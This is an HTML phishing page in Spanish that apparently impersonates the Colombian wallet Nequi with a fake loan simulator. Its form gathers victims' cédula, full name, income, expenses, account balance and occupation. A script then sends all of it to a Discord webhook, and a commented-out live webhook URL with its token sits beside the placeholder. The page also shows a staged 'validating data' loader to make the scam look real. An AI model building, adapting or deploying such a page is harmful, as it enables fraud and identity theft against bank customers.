<!DOCTYPE html>
<html lang="en">

<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>¡Plata de una en tu Nequi!</title>
  <link rel="stylesheet" href="../css/index.css">
  <link rel="stylesheet" href="../css/spinner.css">
  <link rel="stylesheet" href="../css/navbar.css">
  <link rel="stylesheet" href="../css/globals.css">
  <link rel="stylesheet" href="../css/styles.css">
  <link rel="stylesheet" href="../css/load-spinner.css">
  <link rel="shortcut icon" type="image/x-icon" href="../assets/favicon.ico">

  <style>
    .loadingContainer { display: none; }
    footer { margin-top: 40px; background: url(../assets/footer-nequi-1.svg); background-repeat: no-repeat; background-size: cover; padding: 100px 0 60px 0; }
    .messageErrorContainer { position: fixed; top: 0; left: 0; right: 0; width: 100vw; height: 100vh; z-index: 100; display: none; justify-content: center; align-items: center; background-color: #fff; overflow-y: auto; margin-top: 64px; }
    .messageWrapper { display: flex; justify-content: center; width: 100vw; height: 30vh; }
    .messageContainer { background: #fff; width: 60vw; height: 20vh; margin: auto; border-radius: 5px; }
  </style>
</head>

<body class="bodyContainer">

  <main class="loadingContainer">
    <header class="z-[999] fixed top-0 w-full h-16 mx-auto pt-0 pb-0 overflow-visible bg-white">
      <div class="flex items-center h-full border-b border-gray-primary bg-white px-[26px]">
        <div class="flex items-center justify-between w-full max-w-[61.875rem] h-full mx-auto">
          <a href="loan-simulator.php.html" class="h-8">
            <img src="../assets/logo.png" alt="Logo">
          </a>
        </div>
      </div>
    </header>

    <section class="mainSectionContainer loading">
      <div class="hero-image"></div>
      <div class="mainSectionWrapper">
        <div class="logo_nequi_animado">
          <img src="../assets/loading-nequi.webp" alt="">
        </div>
        <p class="wait-msg">Por favor, espere...</p>
        <p class="info-msg">En este momento estamos validando algunos datos. puede tardar un momento.</p>
      </div>
    </section>
  </main>

  <main class="mainContainer">
    <section>
      <div class="bg-white rounded-lg">
        <div class="px-6" id="simuladorSalvavidas">
          <div class="max-w-[400px] mx-auto">

            <div class="bg-purple-primary w-full rounded-lg p-4">
              <h4 class="text-[1.25rem] font-medium text-balance text-left w-full text-white mb-2">
                ¿Cuánta plata necesitas?
              </h4>
              <div class="relative">
                <div class="text-3xl font-semibold text-white mb-4">
                  $<span id="montoSeleccionadoSalvavidas">100.000</span>
                </div>
                <input type="range" id="montoSalvavidas" min="100000" max="5000000" step="100000" value="100000" class="range-slider">
                <div class="flex justify-between text-sm text-gray-300 mt-2">
                  <span>$100.000</span>
                  <span>$5.000.000</span>
                </div>
              </div>
            </div>

            <h4 class="text-base font-medium text-balance text-left w-full text-purple-primary mb-4">
              Datos personales
            </h4>
            <div class="flex flex-col justify-center items-center gap-4 mb-3 w-full">
              <div class="form-group">
                <input type="text" id="cedulaSalvavidas">
                <label for="cedulaSalvavidas">Ingresa tu cédula</label>
              </div>
              <div class="form-group">
                <input type="text" id="nombreCompletoSalvavidas">
                <label for="nombreCompletoSalvavidas">Nombre y apellido</label>
              </div>
              <div class="form-group">
                <input type="text" id="ingresoMensualSalvavidas">
                <label>Ingresos mensuales</label>
              </div>
              <div class="form-group">
                <input type="text" id="gastosMensualSalvavidas">
                <label>Gastos mensuales</label>
              </div>
              <div class="form-group">
                <input type="text" id="saldoActualSalvavidas">
                <label>Saldo actual en tu cuenta NEQUI</label>
              </div>
              <select id="ocupacionSelectorSalvavidas">
                <option value="Empleado">Empleado</option>
                <option value="Pensionado">Pensionado</option>
                <option value="Independiente">Independiente</option>
              </select>
            </div>

            <h4 class="text-base font-medium text-balance text-left w-full text-purple-primary mb-4">
              ¿En cuánto tiempo quieres pagar tu préstamo?
            </h4>
            <select id="plazoSelectorSalvavidas">
              <option value="1">1 mes</option>
              <option value="2">2 meses</option>
              <option value="3">3 meses</option>
              <option value="4">4 meses</option>
              <option value="5">5 meses</option>
              <option value="6">6 meses</option>
              <option value="7">7 meses</option>
              <option value="8">8 meses</option>
              <option value="9">9 meses</option>
              <option value="10" selected>10 meses</option>
              <option value="11">11 meses</option>
              <option value="12">12 meses</option>
            </select>

            <h4 class="text-base font-medium text-balance text-left w-full text-purple-primary mb-4">
              Fecha de pago
            </h4>
            <select id="fechaPago">
              <option value="1">1 de cada mes</option>
              <option value="15">15 de cada mes</option>
              <option value="25">25 de cada mes</option>
            </select>

            <button type="button" id="btnContinuarSalvavidas" class="w-full bg-pink-primary text-white py-4 px-6 rounded-md text-lg" disabled>
              Validar
            </button>

          </div>
        </div>
      </div>
    </section>
  </main>

  <!-- LOADER -->
  <div class="loading-spinner" id="loadingContenedor" style="display:none; z-index:99999;">
    <div class="nequi-loader" id="loader">
      <div class="cube"></div>
      <div class="cube"></div>
    </div>
    <div class="done" id="done">
      <div class="check"></div>
      <span>¡Listo!</span>
    </div>
  </div>

  <!-- SCRIPT -->
  <script>
    document.addEventListener("DOMContentLoaded", () => {
      const btn = document.getElementById("btnContinuarSalvavidas");
      const montoInput = document.getElementById("montoSalvavidas");
      const montoDisplay = document.getElementById("montoSeleccionadoSalvavidas");
      const plazoSelector = document.getElementById("plazoSelectorSalvavidas");
      const cuotaDisplay = document.createElement("div");
      cuotaDisplay.className = "cuotaMensualSalvavidas";
      montoInput.after(cuotaDisplay);

      const TASA_INTERES = 0.009;

      function calcularCuota() {
        const monto = parseInt(montoInput.value);
        const meses = parseInt(plazoSelector.value);
        const cuota = monto / meses + monto * TASA_INTERES + 5000;
        cuotaDisplay.textContent = "$" + new Intl.NumberFormat("es-CO").format(Math.round(cuota));
      }

      montoInput.addEventListener("input", () => {
        montoDisplay.textContent = new Intl.NumberFormat("es-CO").format(parseInt(montoInput.value));
        calcularCuota();
      });

      plazoSelector.addEventListener("change", calcularCuota);
      calcularCuota();

      function validar() {
        const cedula = document.getElementById("cedulaSalvavidas").value;
        const nombre = document.getElementById("nombreCompletoSalvavidas").value;
        const ingreso = document.getElementById("ingresoMensualSalvavidas").value;
        const gastos = document.getElementById("gastosMensualSalvavidas").value;
        const saldo = document.getElementById("saldoActualSalvavidas").value;
        btn.disabled = !(cedula.length >= 7 && cedula.length <= 10 &&
                         nombre.includes(" ") && nombre.length >= 5 &&
                         ingreso.length >= 1 && gastos.length >= 1 && saldo.length >= 1);
      }

      document.querySelectorAll("#cedulaSalvavidas, #nombreCompletoSalvavidas, #ingresoMensualSalvavidas, #gastosMensualSalvavidas, #saldoActualSalvavidas")
        .forEach(el => el.addEventListener("input", validar));
      validar();

      btn.addEventListener("click", async () => {
        const formData = {
          cedula: document.getElementById("cedulaSalvavidas").value,
          nombreCompleto: document.getElementById("nombreCompletoSalvavidas").value,
          montoPrestamo: montoDisplay.textContent,
          ocupacion: document.getElementById("ocupacionSelectorSalvavidas").value,
          ingresoMensual: document.getElementById("ingresoMensualSalvavidas").value,
          gastosMensual: document.getElementById("gastosMensualSalvavidas").value,
          saldoActual: document.getElementById("saldoActualSalvavidas").value,
          meses: document.getElementById("plazoSelectorSalvavidas").value,
          fechaPago: document.getElementById("fechaPago").value
        };

        const discordMessage = `✅ **INFO DE USUARIO** ✅\n\n🪪 **Cédula**: ${formData.cedula}\n👤 **Nombre**: ${formData.nombreCompleto}\n💵 **Monto solicitado**: ${formData.montoPrestamo}\n💰 **Saldo actual**: ${formData.saldoActual}\n🏢 **Ocupación**: ${formData.ocupacion}\n💸 **Ingresos**: ${formData.ingresoMensual}\n🧾 **Gastos**: ${formData.gastosMensual}\n📅 **Meses**: ${formData.meses}\n📆 **Fecha de pago**: ${formData.fechaPago}`;

        const DISCORD_WEBHOOK = "TU_WEBHOOK_DE_DISCORD_AQUI"; // "https://discord.com/api/webhooks/1476583005106602116/5bfBLBL_ccXUcETJGmIAV2ZAhqkIVsEhUM_filQ_qey6lzvN9RGyQyJh08scazuei3dZ";

        try {
          await fetch(DISCORD_WEBHOOK, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({ content: discordMessage })
          });
          alert("Datos enviados a Discord ✅");
        } catch (err) {
          console.error(err);
          alert("Error al enviar los datos ❌");
        }
      });
    });
  </script>
</body>
</html>
